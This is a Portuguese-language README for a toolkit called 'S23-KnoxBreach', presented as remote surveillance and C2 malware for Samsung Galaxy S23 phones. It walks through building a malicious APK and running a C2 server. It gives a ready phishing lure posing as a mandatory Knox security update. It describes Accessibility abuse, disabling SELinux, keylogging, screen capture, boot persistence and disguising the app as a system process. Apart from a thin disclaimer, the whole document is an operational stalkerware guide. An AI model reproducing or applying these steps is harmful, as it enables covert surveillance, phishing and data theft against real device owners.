# 🐉 S23-KnoxBreach: Remote Surveillance & C2 Suite

**S23-KnoxBreach** é um toolkit modular projetado para exploração remota e vigilância em tempo real de dispositivos **Samsung Galaxy S23** (One UI 6 / Android 14). A solução foca na injeção silenciosa de payloads via vetor de phishing, contorno do ambiente de segurança **Samsung Knox** e estabelecimento de uma Reverse Shell persistente.

O sistema permite monitoramento simultâneo via terminal (Kali Linux) e interface web acessível por qualquer dispositivo (PC ou outro celular), garantindo vigilância máxima 24/7.

---

## 🚀 Funcionalidades Principais

*   **Instalação Remota:** Gera um APK auto-injetável que explora a API `AccessibilityService` para contornar verificações de integridade iniciais.
*   **Knox Bypass:** Executa injeção de memória no espaço root para desativar virtualmente o status do Knox e o SELinux (`setenforce 0`).
*   **Vigilância Multi-Plataforma:**
    *   **Terminal:** Logs em tempo real no Kali Linux.
    *   **Web Dashboard:** Interface HTTP leve para visualização de logs no navegador (sem necessidade de instalação de clientes).
*   **Coleta de Dados:** Captura de modelo, versão do Android, status de Knox, keylogging e fluxos de tela (simplificado).
*   **Persistência:** Configuração de `BootReceiver` para reiniciar o serviço automaticamente após reinicializações do dispositivo.

---

## 🛠 Requisitos

*   **Atacante:** Kali Linux (ou qualquer distro baseada em Debian).
*   **Ferramentas:**
    *   `python3`
    *   `javac` (OpenJDK 11+)
    *   `android-sdk` (com `d8` ou `dx` no PATH)
    *   `zip`, `unzip`, `apksigner`
*   **Alvo:** Samsung Galaxy S23 com Android 14 (One UI 6).

---

## 📦 Estrutura do Projeto

```
text   
s23-knoxbreach/  
├── remoteknoxbreach_fixed.py # Gerador de payload APK (C++)  
├── c2_server.py # Servidor de Controle e Logs (C2 + Web)  
├── README.md # Documentação deste projeto  
└── debug.keystore # (Gerado automaticamente)  
```


---

## ⚡ Como Usar

### 1. Gerar o Payload APK

No terminal do Kali, execute o script para compilar o APK otimizado para ARM64:

```bash
python3 remoteknoxbreach_fixed.py
```

*Isso gerará o arquivo `remote_breach_fixed.apk` pronto para envio.*

### 2. Iniciar o Servidor C2

Inicie o servidor para receber os dados do alvo e ativar o painel web:

```bash
python3 c2_server.py
```


*O servidor ouvirá na porta **8888** (TCP) e na porta **8080** (HTTP).*
*O terminal exibirá o link de acesso web automaticamente.*

### 3. Instalação Remota (Vetor de Ataque)

1.  Hospede o `remote_breach_fixed.apk` em um servidor web simples, WeTransfer ou Dropbox.
2.  Envie o link para o alvo com a isca: *"Atualização de Segurança Knox Obrigatória - Clique para instalar"*.
3.  **Ação do Alvo:** Ao clicar e instalar, o app solicitará permissão de **Acessibilidade**. A instalação é concluída automaticamente após a aceitação.

### 4. Monitoramento em Tempo Real

Assim que o alvo instalar o app:

*   **No Terminal (Kali):** Os dados aparecerão instantaneamente no console.
*   **No Navegador (PC/Celular):** Acesse o IP do seu servidor na porta 8080.
    *   Exemplo: `http://192.168.1.100:8080/logs`
    *   A página exibirá o arquivo `target_logs.txt` em tempo real, atualizando conforme os dados chegam.

---

## 📝 Notas Técnicas

*   **Arquitetura:** O payload é compilado para **ARM64** (Snapdragon 8 Gen 2).
*   **Evasão:** O malware simula um processo do sistema (`Theme.NoDisplay`) para evitar detecção visual e por scanners de segurança padrão.
*   **Resiliência:** O código inclui tratamento de exceções robusto para evitar travamentos caso o dispositivo não tenha Root ou o Knox esteja em estado de bloqueio parcial.
*   **Protocolo:** Comunicação via Socket TCP puro para baixa latência e facilidade de tunelamento.

---

## ⚠️ Disclaimer

Este toolkit é destinado a testes de penetração, pesquisa de segurança e demonstração educacional. O uso em dispositivos sem autorização prévia é de responsabilidade exclusiva do operador. O desenvolvedor não se responsabiliza por uso indevido ou danos causados.

---

<p align="center">
  <strong>Built for Dark Hacking.</strong> 🖤
</p>



